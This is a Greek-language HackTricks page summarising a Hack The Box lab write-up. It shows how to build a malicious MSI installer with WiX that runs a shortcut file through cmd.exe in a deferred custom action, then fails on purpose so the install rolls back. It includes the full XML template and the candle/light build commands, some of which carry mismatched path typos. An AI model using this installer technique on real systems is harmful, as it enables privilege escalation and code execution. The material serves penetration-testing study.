# Δημιουργία κακόβουλου MSI και απόκτηση Root

{{#include ../../banners/hacktricks-training.md}}

Η δημιουργία του MSI installer θα γίνει με χρήση του wixtools, συγκεκριμένα θα χρησιμοποιηθεί το [wixtools](http://wixtoolset.org). Αξίζει να αναφερθεί ότι δοκιμάστηκαν εναλλακτικά MSI builders, αλλά δεν ήταν επιτυχή στη συγκεκριμένη περίπτωση.<sup>[[1]](#references)</sup>

Για μια ολοκληρωμένη κατανόηση των παραδειγμάτων χρήσης του wix MSI, συνιστάται να συμβουλευτείτε [αυτή τη σελίδα](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Εκεί μπορείτε να βρείτε διάφορα παραδείγματα που παρουσιάζουν τη χρήση του wix MSI.<sup>[[2]](#references)</sup>

Ο στόχος είναι να δημιουργηθεί ένα MSI που θα εκτελεί το αρχείο lnk. Για να επιτευχθεί αυτό, θα μπορούσε να χρησιμοποιηθεί ο ακόλουθος κώδικας XML ([xml από εδώ](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Είναι σημαντικό να σημειωθεί ότι το στοιχείο Package περιέχει attributes όπως τα InstallerVersion και Compressed, τα οποία καθορίζουν την έκδοση του installer και υποδεικνύουν αντίστοιχα αν το package είναι compressed ή όχι.

Η διαδικασία δημιουργίας περιλαμβάνει τη χρήση του candle.exe, ενός tool από το wixtools, για τη δημιουργία ενός wixobject από το msi.xml. Πρέπει να εκτελεστεί η ακόλουθη εντολή:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Επιπλέον, αξίζει να αναφερθεί ότι στην ανάρτηση παρέχεται μια εικόνα, η οποία απεικονίζει την εντολή και την έξοδό της. Μπορείτε να ανατρέξετε σε αυτήν για οπτική καθοδήγηση.<sup>[[1]](#references)</sup>

Επιπλέον, το light.exe, ένα ακόμη εργαλείο από το wixtools, θα χρησιμοποιηθεί για τη δημιουργία του αρχείου MSI από το wixobject. Η εντολή που θα εκτελεστεί είναι η εξής:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Παρόμοια με την προηγούμενη εντολή, στο post περιλαμβάνεται μια εικόνα που απεικονίζει την εντολή και την έξοδό της.<sup>[[1]](#references)</sup>

Σημειώστε ότι, παρόλο που αυτή η σύνοψη αποσκοπεί στην παροχή χρήσιμων πληροφοριών, συνιστάται να ανατρέξετε στο αρχικό post για πιο ολοκληρωμένες λεπτομέρειες και ακριβείς οδηγίες.<sup>[[1]](#references)</sup>

## Αναφορές

- [1] [Hack The Box - Ethereal: Δημιουργία κακόβουλου msi και απόκτηση root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Μια σύντομη εισαγωγή: Δημιουργία ενός MSI installer με WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (δείτε επίσης το [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
